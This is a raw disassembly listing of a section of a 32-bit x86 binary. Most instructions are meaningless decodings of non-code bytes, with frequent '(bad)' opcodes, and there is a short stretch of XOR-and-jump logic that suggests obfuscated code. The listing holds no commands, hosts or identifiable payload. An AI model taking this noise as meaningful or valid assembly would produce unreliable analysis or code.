  40a88c:	sub    BYTE PTR [ebx-0x1c],ch
  40a88f:	(bad)  
  40a890:	push   eax
  40a891:	jg     0x40a8c6
  40a893:	inc    ecx
  40a894:	mov    bh,0xd2
  40a896:	jge    0x40a86c
  40a898:	and    al,0x15
  40a89a:	not    edi
  40a89c:	fiadd  DWORD PTR [eax+0x1d30049e]
  40a8a2:	or     DWORD PTR [edx+0x35],ecx
  40a8a5:	loope  0x40a858
  40a8a7:	mov    ch,ch
  40a8a9:	push   esp
  40a8aa:	pop    esp
  40a8ab:	test   eax,0xe6bbdfaf
  40a8b0:	test   al,0x73
  40a8b2:	(bad)  
  40a8b3:	pop    esp
  40a8b4:	xor    DWORD PTR [eax-0x59cc87b0],ebx
  40a8ba:	mov    dh,0x7a
  40a8bc:	push   0xb8bf25fc
  40a8c1:	fs jp  0x40a929
  40a8c4:	mov    ebx,0xf7538ff0
  40a8c9:	or     bl,BYTE PTR [edx-0x3a]
  40a8cc:	or     ebp,ebp
  40a8ce:	ins    DWORD PTR es:[edi],dx
  40a8cf:	jecxz  0x40a8bc
  40a8d1:	jae    0x40a91a
  40a8d3:	jge    0x40a881
  40a8d5:	cdq    
  40a8d6:	pop    edx
  40a8d7:	fbstp  TBYTE PTR [eax]
  40a8d9:	mov    ebx,esi
  40a8db:	in     eax,dx
  40a8dc:	into   
  40a8dd:	dec    ecx
  40a8de:	sbb    eax,0xa9aee7ca
  40a8e3:	lahf   
  40a8e4:	pop    eax
  40a8e5:	outs   dx,DWORD PTR ds:[esi]
  40a8e6:	push   0x85a1b474
  40a8eb:	push   ds
  40a8ec:	adc    eax,0xb89aaa5b
  40a8f1:	imul   esp,DWORD PTR [edi-0x36deecb8],0x366910fc
  40a8fb:	xchg   ecx,eax
  40a8fc:	jmp    0x40a8d0
  40a8fe:	mov    ecx,0x26359b1
  40a903:	jecxz  0x40a965
  40a905:	mov    cl,0x6e
  40a907:	ss pop edi
  40a909:	jns    0x40a8df
  40a90b:	mov    edx,DWORD PTR [ebx]
  40a90d:	add    al,BYTE PTR [edx-0x68]
  40a910:	hlt    
  40a911:	mov    ds:0xf1987532,eax
  40a916:	add    eax,0xeb79db6f
  40a91b:	lods   eax,DWORD PTR ds:[esi]
  40a91c:	leave  
  40a91d:	or     eax,DWORD PTR [ebx]
  40a91f:	dec    eax
  40a920:	(bad)
  40a923:	repnz cmp BYTE PTR [eax],al
  40a926:	cwde   
  40a927:	xchg   ecx,eax
  40a928:	xor    eax,0xc5e286f1
  40a92d:	cld    
  40a92e:	retf   0x4e80
  40a931:	and    BYTE PTR [edi-0x14],0x7f
  40a935:	and    dl,bh
  40a937:	scas   eax,DWORD PTR es:[edi]
  40a938:	mov    ds:0x810f5f76,eax
  40a93d:	mov    ch,0x4
  40a93f:	inc    ecx
  40a940:	dec    esp
  40a941:	push   ebx
  40a942:	push   edi
  40a943:	adc    al,0x7d
  40a945:	mov    eax,0x8293ae47
  40a94a:	cmp    BYTE PTR [eax-0x22],dh
  40a94d:	push   edx
  40a94e:	mov    WORD PTR [edx-0x1],ds
  40a951:	sbb    DWORD PTR [ebx],eax
  40a953:	fld    QWORD PTR [eax+0x71]
  40a956:	scas   eax,DWORD PTR es:[edi]
  40a957:	sub    eax,ebp
  40a959:	out    0x91,al
  40a95b:	fdivr  QWORD PTR [ecx]
  40a95d:	ss xchg ebp,eax
  40a95f:	test   BYTE PTR [ecx-0x14],cl
  40a962:	sbb    DWORD PTR [ecx+0x47],0xe686b9c5
  40a969:	jb     0x40a966
  40a96b:	jl     0x40a9d9
  40a96d:	xchg   esp,eax
  40a96e:	icebp  
  40a96f:	xor    BYTE PTR [esi-0x50030101],bl
  40a975:	loope  0x40a9d2
  40a977:	bound  ecx,QWORD PTR [esi]
  40a979:	hlt    
  40a97a:	mov    edi,0x2d0a8e6d
  40a97f:	add    esi,DWORD PTR [ecx+0x8]
  40a982:	iret   
  40a983:	aas    
  40a984:	ja     0x40a9da
  40a986:	push   ebx
  40a987:	(bad)  
  40a989:	gs push ebp
  40a98b:	push   ebx
  40a98c:	scas   eax,DWORD PTR es:[edi]
  40a98d:	fst    DWORD PTR [eax+eax*2-0x11e25b36]
  40a994:	add    eax,0x9a5022a
  40a999:	add    esi,DWORD PTR [edi]
  40a99b:	pop    ecx
  40a99c:	xor    al,0x5
  40a99e:	jo     0x40a99e
  40a9a0:	shl    BYTE PTR [esp+edx*4+0xb],0x23
  40a9a5:	rcl    ecx,cl
  40a9a7:	retf   0xe8d8
  40a9aa:	icebp  
  40a9ab:	(bad)  
  40a9ac:	cmc    
  40a9ad:	push   ebx
  40a9ae:	xor    BYTE PTR [eax+eax*2-0x71025330],0xa4
  40a9b6:	add    al,0x66
  40a9b8:	xchg   ebp,eax
  40a9b9:	idiv   DWORD PTR [eax-0x77]
  40a9bc:	aad    0x3e
  40a9be:	jmp    0x40aa38
  40a9c0:	inc    ecx
  40a9c1:	mov    ebp,0x81d00bb7
  40a9c6:	mov    ah,0x34
  40a9c8:	into   
  40a9c9:	xchg   BYTE PTR ds:0x9ce0f2c2,dh
  40a9cf:	rcr    BYTE PTR ds:0x13168611,0x49
  40a9d6:	mov    bl,0x76
  40a9d8:	sub    BYTE PTR [ebp+0x11571e38],cl
  40a9de:	inc    esi
  40a9df:	inc    bp
  40a9e1:	xchg   edx,eax
  40a9e2:	sbb    BYTE PTR [ebx+0x2d],0x66
  40a9e6:	or     dl,BYTE PTR ds:0x9452e87c
  40a9ec:	xchg   esp,eax
  40a9ed:	(bad)  
  40a9ee:	jl     0x40aa2b
  40a9f0:	dec    ecx
  40a9f1:	sbb    eax,0x54ba828f
  40a9f6:	hlt    
  40a9f7:	push   edx
  40a9f8:	pop    es
  40a9f9:	and    bl,BYTE PTR [eax-0x6f]
  40a9fc:	xchg   edi,eax
  40a9fd:	mov    cl,0x9c
  40a9ff:	jmp    0xdeeb:0xb6ad17c3
  40aa06:	(bad)
  40aa0a:	dec    edi
  40aa0b:	and    BYTE PTR [ebx],cl
  40aa0d:	in     al,dx
  40aa0e:	cmp    dl,BYTE PTR [ecx-0x316a702f]
  40aa14:	xchg   esp,eax
  40aa15:	dec    ebx
  40aa16:	fbstp  TBYTE PTR ss:[ebx-0x5d]
  40aa1a:	cmp    ah,bl
  40aa1c:	ins    BYTE PTR es:[edi],dx
  40aa1d:	aad    0xb3
  40aa1f:	test   al,0xcd
  40aa21:	mov    eax,0x2f28b83c
  40aa26:	mov    ah,0x40
  40aa28:	inc    ecx
  40aa29:	call   0xe9e2:0x1813d37a
  40aa30:	aaa    
  40aa31:	or     edi,DWORD PTR [ecx-0xc6959d7]
  40aa37:	mov    al,ds:0xff3e7b3e
  40aa3c:	xchg   DWORD PTR [ecx-0x31],edi
  40aa3f:	inc    edx
  40aa40:	popf   
  40aa41:	(bad)  
  40aa42:	push   ss
  40aa43:	and    DWORD PTR [eax+0x56],esp
  40aa46:	add    bl,bl
  40aa48:	or     DWORD PTR [eax-0x26],ebp
  40aa4b:	push   esi
  40aa4c:	jns    0x40aa99
  40aa4e:	imul   edi,DWORD PTR [edx],0xfffffff7
  40aa51:	ret    
  40aa52:	or     eax,0x5a81a8cc
  40aa58:	test   ch,cl
  40aa5a:	es addr16 mov bl,0xc3
  40aa5e:	lea    ebp,[esi]
  40aa60:	pop    ecx
  40aa61:	sbb    dl,BYTE PTR [ebp-0x6]
  40aa64:	cmp    al,0x74
  40aa66:	cmp    bl,BYTE PTR [esi]
  40aa68:	inc    ebx
  40aa69:	xor    ebp,DWORD PTR [ecx-0x6875a317]
  40aa6f:	push   ebx
  40aa70:	and    DWORD PTR [ebp-0x1297b516],esi
  40aa76:	xchg   ecx,esp
  40aa78:	mov    dl,0x87
  40aa7a:	hlt    
  40aa7b:	loop   0x40aa0e
  40aa7d:	fs mov edx,0xc2b9e943
  40aa83:	inc    esi
  40aa84:	or     bh,BYTE PTR cs:[ebp-0x3a]
  40aa88:	jno    0x40aa10
  40aa8a:	scas   eax,DWORD PTR es:[edi]
  40aa8b:	test   eax,0x2b0e30a6
  40aa90:	sbb    DWORD PTR [ebp+0x5cbba1b0],0xfffffffd
  40aa97:	cmp    eax,0x7dc2df5d
  40aa9c:	or     esi,esi
  40aa9e:	(bad)  
  40aa9f:	idiv   DWORD PTR ss:[edi+0x15]
  40aaa3:	mul    dl
  40aaa5:	and    BYTE PTR [eax-0x6a],dh
  40aaa8:	repnz fsubr QWORD PTR gs:[eax-0x12]
  40aaad:	shl    BYTE PTR [edi+0x46],cl
  40aab0:	and    ebp,DWORD PTR [edx+0xd]
  40aab3:	push   eax
  40aab4:	adc    ah,BYTE PTR [eax-0x5cd1bb9]
  40aaba:	xchg   edx,eax
  40aabb:	dec    eax
  40aabc:	add    dl,0x29
  40aabf:	call   0xcfb1178d
  40aac4:	jbe    0x40ab40
  40aac6:	dec    esp
  40aac7:	lea    ebx,[ebx+eax*2+0x22369e6]
  40aace:	icebp  
  40aacf:	aad    0x82
  40aad1:	and    cl,dl
  40aad3:	adc    BYTE PTR [edx-0x26],ah
  40aad6:	pop    ss
  40aad7:	fstp   DWORD PTR [ebx]
  40aad9:	adc    al,0x8b
  40aadb:	(bad)  
  40aadc:	mov    ebx,?
  40aade:	ins    DWORD PTR es:[edi],dx
  40aadf:	bnd jo 0x40ab0c
  40aae2:	mov    gs,esi
  40aae4:	sub    edi,eax
  40aae6:	dec    ecx
  40aae7:	sbb    bh,0x64
  40aaea:	pop    es
  40aaeb:	repnz pushf 
  40aaed:	ins    DWORD PTR es:[edi],dx
  40aaee:	sub    eax,0xf7f982ac
  40aaf3:	fucomp st(7)
  40aaf5:	loope  0x40ab6a
  40aaf7:	ins    DWORD PTR es:[edi],dx
  40aaf8:	sub    esi,DWORD PTR [eax+0x50b124a4]
  40aafe:	and    DWORD PTR [ecx+esi*4],0x8dcda53f
  40ab05:	lods   eax,DWORD PTR ds:[esi]
  40ab06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab07:	cmp    ebx,DWORD PTR [ecx-0x50]
  40ab0a:	dec    esi
  40ab0b:	inc    eax
  40ab0c:	in     al,0x84
  40ab0e:	mov    al,ds:0x7a4f54e4
  40ab13:	jne    0x40aaf1
  40ab15:	and    bl,al
  40ab17:	push   ecx
  40ab18:	or     BYTE PTR [edx],ah
  40ab1a:	mov    edx,0xa073517b
  40ab1f:	rdmsr  
  40ab21:	add    BYTE PTR [edi],dh
  40ab23:	sbb    BYTE PTR [esi+0x34c75ebe],ah
  40ab29:	cdq    
  40ab2a:	push   esp
  40ab2b:	je     0x40ab0d
  40ab2d:	mov    eax,ds:0x56541a55
  40ab32:	cdq    
  40ab33:	jo     0x40ab11
  40ab35:	sbb    DWORD PTR [eax],ecx
  40ab37:	push   ecx
  40ab38:	lods   al,BYTE PTR ds:[esi]
  40ab39:	dec    esi
  40ab3a:	sbb    DWORD PTR [esi],0xffffff8c
  40ab3d:	dec    esp
  40ab3e:	cmp    DWORD PTR [edi-0x2f1effaf],0x51
  40ab45:	shl    BYTE PTR [edx],cl
  40ab47:	pop    ecx
  40ab48:	cmp    eax,ecx
  40ab4a:	call   0x855fe1cb
  40ab4f:	scas   eax,DWORD PTR es:[edi]
  40ab50:	ja     0x40aaf4
  40ab52:	(bad)  
  40ab53:	sti    
  40ab54:	add    bh,BYTE PTR [edi-0x44]
  40ab57:	dec    ebx
  40ab58:	jnp    0x40ab91
  40ab5a:	out    dx,al
  40ab5b:	mov    al,ds:0x4a77cb6b
  40ab60:	inc    esi
  40ab61:	xchg   edi,eax
  40ab62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab63:	jbe    0x40ab78
  40ab65:	pop    es
  40ab66:	jmp    0x40ab14
  40ab68:	mov    ah,0x58
  40ab6a:	cmc    
  40ab6b:	outs   dx,BYTE PTR ds:[esi]
  40ab6c:	outs   dx,BYTE PTR ds:[esi]
  40ab6d:	jae    0x40ab0f
  40ab6f:	pop    esp
  40ab70:	mov    dh,bl
  40ab72:	xor    DWORD PTR [edx+0x4ff759ad],esp
  40ab78:	jmp    0x40ab0e
  40ab7a:	xchg   edx,eax
  40ab7b:	xchg   esp,eax
  40ab7c:	mov    WORD PTR [eax+0x55],?
  40ab7f:	jo     0x40abe9
  40ab81:	mov    edi,0x18c99813
  40ab86:	test   ebx,ecx
  40ab88:	fidiv  DWORD PTR [edx+0xf6c5204]
  40ab8e:	dec    esi
  40ab8f:	dec    edx
  40ab90:	(bad)  
  40ab91:	add    BYTE PTR [edx+0x58],cl
  40ab94:	jg     0x40aba2
  40ab96:	call   0x98083e75
  40ab9b:	fsubr  QWORD PTR [ecx-0x7db6b8af]
  40aba1:	or     al,0x9d
  40aba3:	push   eax
  40aba4:	or     ecx,DWORD PTR [ebx+0x5b9c2664]
  40abaa:	test   ecx,0x69a6ba47
  40abb0:	into   
  40abb1:	adc    al,0x8e
  40abb3:	sbb    BYTE PTR [eax+0x3d2defe0],dl
  40abb9:	sub    DWORD PTR [esp+eiz*2+0x7c],eax
  40abbd:	mov    ds:0x2b55a73c,eax
  40abc2:	sbb    BYTE PTR ds:0x892777ea,ch
  40abc8:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40abca:	fadd   DWORD PTR [ebx-0x68]
  40abcd:	les    esp,FWORD PTR [eax-0x29]
  40abd0:	cwde   
  40abd1:	fidivr DWORD PTR [ecx+0x56d58da3]
  40abd7:	daa    
  40abd8:	fst    QWORD PTR [ecx-0x5b]
  40abdb:	xor    al,0x4f
  40abdd:	inc    ebp
  40abde:	in     eax,dx
  40abdf:	in     al,0x2e
  40abe1:	mov    dl,0xad
  40abe3:	adc    al,0xc
  40abe5:	outs   dx,DWORD PTR ds:[esi]
  40abe6:	push   ebp
  40abe7:	aas    
  40abe8:	dec    esp
  40abe9:	scas   al,BYTE PTR es:[edi]
  40abea:	or     ebx,DWORD PTR [esi-0x3]
  40abed:	gs ins BYTE PTR es:[edi],dx
  40abef:	add    BYTE PTR es:[ecx-0x3635db24],0xde
  40abf7:	inc    ecx
  40abf8:	adc    al,al
  40abfa:	inc    edi
  40abfb:	jecxz  0x40ac32
  40abfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40abfe:	mov    edi,DWORD PTR [edx-0x1941fe27]
  40ac04:	(bad)  
  40ac05:	dec    ebx
  40ac06:	mov    eax,0x8ce92599
  40ac0b:	xchg   ebp,eax
  40ac0c:	imul   edx,DWORD PTR [ebx+0x44],0x3dd9846f
  40ac13:	inc    eax
  40ac14:	pop    esp
  40ac15:	adc    DWORD PTR [edx-0x3fe92777],0xd
  40ac1c:	cdq    
  40ac1d:	pop    esi
  40ac1e:	adc    esp,ecx
  40ac20:	push   esi
  40ac21:	std    
  40ac22:	sub    eax,0xb1bc2ff
  40ac27:	test   ebx,ebp
  40ac29:	add    bl,BYTE PTR [ebx]
  40ac2b:	mov    WORD PTR [eax-0x79],gs
  40ac2e:	nop
  40ac2f:	cld    
  40ac30:	in     eax,dx
  40ac31:	retf   
  40ac32:	fmul   st,st(6)
  40ac34:	repz in eax,dx
  40ac36:	scas   al,BYTE PTR es:[edi]
  40ac37:	out    0x7,al
  40ac39:	cmp    al,0xee
  40ac3b:	add    al,0x12
  40ac3d:	(bad)  
  40ac3f:	(bad)  
  40ac40:	lock fst QWORD PTR [eax+edi*4]
  40ac44:	iret   
  40ac45:	xor    bh,ch
  40ac47:	add    ch,dh
  40ac49:	ret    0x2da
  40ac4c:	fld    DWORD PTR [edx+ecx*8+0x57]
  40ac50:	pop    eax
  40ac51:	inc    ecx
  40ac52:	lea    esp,[esp+edx*4+0x3e163e39]
  40ac59:	xor    al,0x4c
  40ac5b:	xor    ecx,DWORD PTR ds:0x7b4aab11
  40ac61:	dec    ebp
  40ac62:	das    
  40ac63:	jp     0x40ac18
  40ac65:	pop    es
  40ac66:	push   0x946a644d
  40ac6b:	or     eax,DWORD PTR [esp+ebx*2-0x821a5cb]
  40ac72:	ins    BYTE PTR es:[edi],dx
  40ac73:	cmc    
  40ac74:	sub    ah,bh
  40ac76:	leave  
  40ac77:	jmp    0x5459:0x7b7a9690
  40ac7e:	out    0x9e,al
  40ac80:	push   edi
  40ac81:	ret    
  40ac82:	mov    esi,0x71972079
  40ac87:	sub    al,0x89
  40ac8a:	shl    DWORD PTR [edi-0x57baec3d],cl
  40ac90:	retf   0x32c5
  40ac93:	in     eax,0x76
  40ac95:	(bad)  [ecx+0x2d]
  40ac98:	push   es
  40ac99:	mov    cl,0xf4
  40ac9b:	or     eax,ebx
  40ac9d:	cmp    eax,0xb0171148
  40aca2:	mov    ecx,0xba891c65
  40aca7:	mov    ds:0x65e8f596,al
  40acac:	cmp    ah,BYTE PTR [ecx-0x40]
  40acaf:	mov    eax,ebp
  40acb1:	cmp    DWORD PTR [ecx],esi
  40acb3:	mov    cl,0x88
  40acb5:	enter  0x8bf1,0xa6
  40acb9:	push   edx
  40acba:	out    dx,al
  40acbb:	jmp    0x40acff
  40acbd:	sub    BYTE PTR [edx-0x565dea2f],dh
  40acc3:	lods   al,BYTE PTR ds:[esi]
  40acc4:	xor    al,0x36
  40acc6:	pop    esp
  40acc7:	pop    es
  40acc8:	int    0xa3
  40acca:	push   esi
  40accb:	mov    cl,0xfd
  40accd:	mov    edi,0xb289d5f7
  40acd2:	cmp    esi,DWORD PTR [ecx]
  40acd4:	pop    esi
  40acd5:	add    al,0x4c
  40acd7:	mov    cl,0x1e
  40acd9:	adc    esi,DWORD PTR [ebx+0x3f145926]
  40acdf:	pop    DWORD PTR [edi+0x3]
  40ace2:	sti    
  40ace3:	mov    WORD PTR [eax],ds
  40ace5:	stos   BYTE PTR es:[edi],al
  40ace6:	pop    esi
  40ace7:	push   0xe91476c
  40acec:	test   BYTE PTR ds:0xaac66f4a,bl
  40acf2:	aaa    
  40acf3:	dec    ecx
  40acf4:	out    0x23,al
  40acf6:	xchg   dl,bh
  40acf8:	cmp    BYTE PTR [ebx+0x10794f58],dl
  40acfe:	mov    cl,0x52
  40ad00:	lock jae 0x40ad4c
  40ad03:	and    DWORD PTR [ebx*4+0x691f2fe1],edi
  40ad0a:	dec    edi
  40ad0b:	or     ecx,DWORD PTR [edi]
  40ad0d:	cmp    ecx,edx
  40ad0f:	(bad)  
  40ad10:	or     al,0x7b
  40ad12:	and    esi,esi
  40ad14:	xchg   ebp,eax
  40ad15:	push   ss
  40ad16:	and    ch,BYTE PTR [ebp-0x771c1d1e]
  40ad1c:	cmp    eax,0x7c88391f
  40ad21:	pop    ds
  40ad22:	mov    DWORD PTR [ecx-0x6955da19],edx
  40ad28:	mov    ah,0x89
  40ad2a:	sbb    al,0x53
  40ad2c:	sbb    bl,cl
  40ad2e:	sub    bl,BYTE PTR [ecx]
  40ad30:	lods   al,BYTE PTR ds:[esi]
  40ad31:	inc    edi
  40ad32:	adc    al,0xc3
  40ad34:	das    
  40ad35:	pop    ebp
  40ad36:	iret   
  40ad37:	add    BYTE PTR [edx],dh
  40ad39:	xor    esi,DWORD PTR [ecx-0x3]
  40ad3c:	jmp    0x9a3c57e
  40ad41:	xchg   edx,eax
  40ad42:	retf   0x3d55
  40ad45:	and    esp,DWORD PTR [ebx]
  40ad47:	xchg   esi,eax
  40ad48:	stos   DWORD PTR es:[edi],eax
  40ad49:	lods   al,BYTE PTR ds:[esi]
  40ad4a:	mov    al,0x52
  40ad4c:	enter  0x4d6f,0xcd
  40ad50:	out    dx,eax
  40ad51:	xchg   esp,eax
  40ad52:	jecxz  0x40ad2e
  40ad54:	and    al,0x4a
  40ad56:	pop    ecx
  40ad57:	adc    DWORD PTR [eax],eax
  40ad59:	mov    ah,BYTE PTR [edx+0x54]
  40ad5c:	cmp    edi,DWORD PTR [esi+eiz*1+0x67]
  40ad60:	inc    ebp
  40ad61:	das    
  40ad62:	and    ecx,DWORD PTR [ebx]
  40ad64:	adc    ebx,DWORD PTR [edi]
  40ad66:	inc    esp
  40ad67:	fsubr  st(1),st
  40ad69:	aad    0x8a
  40ad6b:	js     0x16608791
  40ad71:	jnp    0x40ad70
  40ad73:	sahf   
  40ad74:	mov    bl,0x9e
  40ad76:	pushf  
  40ad77:	shl    dh,0xb1
  40ad7a:	add    ebp,0x89eba6b3
  40ad80:	fiadd  DWORD PTR [ebx]
  40ad82:	cmp    ch,BYTE PTR ds:0xdb33fc1b
  40ad88:	lods   eax,DWORD PTR ds:[esi]
  40ad89:	xor    al,0xfd
  40ad8b:	mov    al,0xab
  40ad8d:	je     0x40ad6d
  40ad8f:	fwait
  40ad90:	cdq    
  40ad91:	push   0xbc5804e
  40ad96:	sbb    eax,0xa3e61a78
  40ad9b:	lods   al,BYTE PTR ds:[esi]
  40ad9c:	inc    ecx
  40ad9d:	xchg   ecx,eax
  40ad9e:	adc    al,0xdf
  40ada0:	arpl   ax,bx
  40ada2:	push   ebp
  40ada3:	xlat   BYTE PTR ds:[ebx]
  40ada4:	out    0x9,eax
  40ada6:	sub    eax,0x9dd41fc
  40adab:	pop    es
  40adac:	test   DWORD PTR [edi+edx*2-0x52468ef7],ecx
  40adb3:	adc    eax,0xa991521
  40adb8:	psubusw mm7,QWORD PTR [esi-0x28]
  40adbc:	xor    ecx,DWORD PTR [esp+edx*2-0x1b98ce4c]
  40adc3:	pop    ss
  40adc4:	push   ebx
  40adc5:	loopne 0x40ad5e
  40adc7:	cmp    ebx,eax
  40adc9:	cmp    eax,0x765df7eb
  40adce:	mov    eax,0xfe187d4d
  40add3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40add4:	pop    ebp
  40add5:	add    al,dh
  40add7:	out    0x2e,eax
  40add9:	jmp    0x40ae40
  40addb:	dec    esi
  40addc:	retf   0x7c35
  40addf:	jge    0x40ae09
  40ade1:	jg     0x40ad9b
  40ade3:	faddp  st(1),st
  40ade5:	xchg   BYTE PTR [ebx+eax*8+0x1c7c125c],ah
  40adec:	in     eax,dx
  40aded:	jmp    0xbe3f11
  40adf2:	sub    DWORD PTR [edi-0x1ca0298b],ebp
  40adf8:	stos   BYTE PTR es:[edi],al
  40adf9:	in     al,dx
  40adfa:	fdiv   st(5),st
  40adfc:	cs push ds
  40adfe:	push   edx
  40adff:	stos   BYTE PTR es:[edi],al
  40ae00:	cmp    al,0x44
  40ae02:	pop    ebp
  40ae03:	pop    esi
  40ae04:	test   DWORD PTR [esi],0xd0e726ce
  40ae0a:	and    ecx,eax
  40ae0c:	outs   dx,DWORD PTR ds:[si]
  40ae0e:	mov    ecx,0x439d25b5
  40ae13:	jg     0x40adec
  40ae15:	das    
  40ae16:	outs   dx,BYTE PTR ds:[esi]
  40ae17:	lods   al,BYTE PTR ds:[esi]
  40ae18:	and    eax,0x87cafa40
  40ae1d:	call   0x3406b642
  40ae22:	dec    ebp
  40ae23:	pop    esi
  40ae24:	call   0x5f24:0xe2721fc8
  40ae2b:	jnp    0x40ae1e
  40ae2d:	jns    0x40adf6
  40ae2f:	or     eax,0x788baa07
  40ae34:	imul   ecx,DWORD PTR [edi],0xcc2ee6f7
  40ae3a:	dec    esp
  40ae3b:	pop    esp
  40ae3c:	jecxz  0x40ae69
  40ae3e:	jge    0x40ae70
  40ae40:	pop    esp
  40ae41:	jge    0x40ae15
  40ae43:	dec    edi
  40ae44:	and    ecx,0x66e0458e
  40ae4a:	jmp    0x8a40db69
  40ae4f:	pop    eax
  40ae50:	push   ebp
  40ae51:	int3   
  40ae52:	ret    0xc82a
  40ae55:	retf   
  40ae56:	test   DWORD PTR [ecx-0x5a],edx
  40ae59:	mov    DWORD PTR [ecx+ebx*8-0x4f],ebp
  40ae5d:	push   esi
  40ae5e:	mov    esi,DWORD PTR [ecx-0x2]
  40ae61:	xor    al,0x79
  40ae63:	and    ah,BYTE PTR [edi-0x14a21f8b]
  40ae69:	dec    ebx
  40ae6a:	pop    esi
  40ae6b:	jmp    0xaddf:0x75f89ae
  40ae72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae73:	push   esp
  40ae74:	std    
  40ae75:	out    0xde,al
  40ae77:	push   eax
  40ae78:	cmc    
  40ae79:	sbb    eax,0xb12af72
  40ae7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae7f:	leave  
  40ae80:	leave  
  40ae81:	mov    bl,0x35
  40ae83:	call   FWORD PTR [ebx]
  40ae85:	mov    edx,0xedfb32d7
  40ae8a:	jg     0x40ae36
  40ae8c:	mul    DWORD PTR [ecx]
  40ae8e:	ret    
  40ae8f:	rcr    bh,cl
  40ae91:	loopne 0x40aeb8
  40ae93:	pop    es
  40ae94:	jecxz  0x40aea3
  40ae96:	clc    
  40ae97:	mov    ah,0x18
  40ae99:	lock cvtdq2ps xmm1,XMMWORD PTR [eax-0x6e9abd6]
  40aea1:	or     al,BYTE PTR [ecx-0x4162a6e0]
  40aea7:	mov    dl,0x5b
  40aea9:	push   eax
  40aeaa:	cmp    cl,BYTE PTR [edi]
  40aeac:	mov    bh,0x4
  40aeae:	pop    eax
  40aeaf:	mov    ecx,DWORD PTR [ebp-0x14]
  40aeb2:	mov    eax,DWORD PTR [ecx+eax*4]
  40aeb5:	mov    DWORD PTR [ebp-0x38],eax
  40aeb8:	jmp    0x408aae
  40aebd:	mov    eax,DWORD PTR [ebp-0xc]
  40aec0:	xor    eax,esi
  40aec2:	lea    ebx,[ebx+eax*1+0x3272fa]
  40aec9:	jmp    0x4087a7
  40aece:	mov    eax,DWORD PTR [ebp-0x4]
  40aed1:	xor    eax,esi
  40aed3:	add    eax,edi
  40aed5:	jmp    0x40d3b1
  40aeda:	mov    eax,DWORD PTR [ebp-0x38]
  40aedd:	add    eax,DWORD PTR [ebp+0x8]
  40aee0:	mov    DWORD PTR [ebp-0x18],eax
  40aee3:	jmp    0x40d298
  40aee8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aee9:	fisubr WORD PTR [esi]
  40aeeb:	jbe    0x40af63
  40aeed:	jbe    0x40aed6
  40aeef:	outs   dx,BYTE PTR ds:[esi]
  40aef0:	xchg   BYTE PTR [ebx+0x71ea730],al
  40aef6:	repnz or BYTE PTR fs:[ecx],0x7b
  40aefb:	jnp    0x40af10
  40aefd:	pushf  
  40aefe:	jnp    0x40af7b
  40af00:	cwde   
  40af01:	inc    eax
  40af02:	sbb    edx,DWORD PTR [edi]
  40af04:	or     ebx,eax
  40af06:	call   0x48f8:0x4ea1b07c
  40af0d:	ins    DWORD PTR es:[edi],dx
  40af0e:	inc    edx
  40af0f:	out    dx,al
  40af10:	push   ecx
  40af11:	cmp    DWORD PTR [ebp-0x1c],ebp
  40af14:	les    eax,FWORD PTR [edx]
  40af16:	mov    edi,gs
  40af18:	loope  0x40aec1
  40af1a:	mov    eax,ds:0x280dc49c
  40af1f:	jns    0x40af3c
  40af21:	(bad)  
  40af22:	or     al,0x2f
  40af24:	ds jg  0x40aeef
  40af27:	and    bh,BYTE PTR [edi]
  40af29:	jbe    0x40af74
  40af2b:	push   ebp
  40af2c:	jmp    0x968:0x275e70f1
  40af33:	fld    TBYTE PTR [esi]
  40af35:	push   ebp
  40af36:	adc    al,0xb
  40af38:	aas    
  40af39:	fsubp  st(6),st
  40af3b:	add    eax,0xad467e71
  40af40:	mov    ch,BYTE PTR [edi]
  40af42:	mov    bh,0x4f
  40af44:	ins    BYTE PTR es:[edi],dx
  40af45:	sub    DWORD PTR [ebx],eax
  40af47:	ss push cs
  40af49:	cmp    edi,DWORD PTR [edx-0x32475595]
  40af4f:	sub    edx,ecx
  40af51:	cmovb  eax,DWORD PTR [eax-0x588e2e09]
  40af58:	jmp    0x40af05
  40af5a:	cmp    dl,bh
  40af5c:	inc    ebx
  40af5d:	xor    DWORD PTR [edx-0x7d],edx
  40af60:	hlt    
  40af61:	sub    ah,BYTE PTR [edx+0x2c]
  40af64:	fwait
  40af65:	sbb    ch,BYTE PTR [eax+0x2d]
  40af68:	mov    ?,WORD PTR [edi]
  40af6a:	addr16 pop ds
  40af6c:	imul   esp,DWORD PTR [ebx],0x55a37f2b
  40af72:	pop    edx
  40af73:	dec    ebx
  40af74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af75:	xchg   ecx,eax
  40af76:	adc    DWORD PTR [edx+ebp*2-0x69],ebp
  40af7a:	outs   dx,BYTE PTR ds:[esi]
  40af7b:	mov    dh,0xdc
  40af7d:	pop    ebp
  40af7e:	cdq    
  40af7f:	scas   eax,DWORD PTR es:[edi]
  40af80:	xor    ebp,DWORD PTR [eax+esi*1+0x7273ef8e]
  40af87:	mov    ebx,0xccb65a77
  40af8c:	cmp    cl,ch
  40af8e:	xor    eax,0xb7589cbf
  40af93:	retf   
  40af94:	lods   al,BYTE PTR ds:[esi]
  40af95:	dec    esi
  40af96:	mov    ecx,0x8b3bbfdc
  40af9b:	out    0x58,eax
  40af9d:	stc    
  40af9e:	dec    esp
  40af9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40afa0:	mov    dh,0x9d
  40afa2:	push   ecx
  40afa3:	lods   eax,DWORD PTR ds:[esi]
  40afa4:	push   cs
  40afa5:	push   0x866babe7
  40afaa:	or     DWORD PTR [edi+0x6f741526],edi
  40afb0:	cmovnp ecx,esi
  40afb3:	pop    ds
  40afb4:	fst    QWORD PTR [edi]
  40afb6:	retf   0x9ba0
  40afb9:	mov    cl,0xea
  40afbb:	mov    edi,0x9cac9955
  40afc0:	mov    DWORD PTR [edi+edx*2-0x66f7f31e],ebx
  40afc7:	rcl    DWORD PTR [eax+esi*2-0x29],cl
  40afcb:	out    0x0,al
  40afcd:	lea    ecx,[ebx]
  40afcf:	nop
  40afd0:	stos   DWORD PTR es:[edi],eax
  40afd1:	jg     0x40b02c
  40afd3:	es gs dec ecx
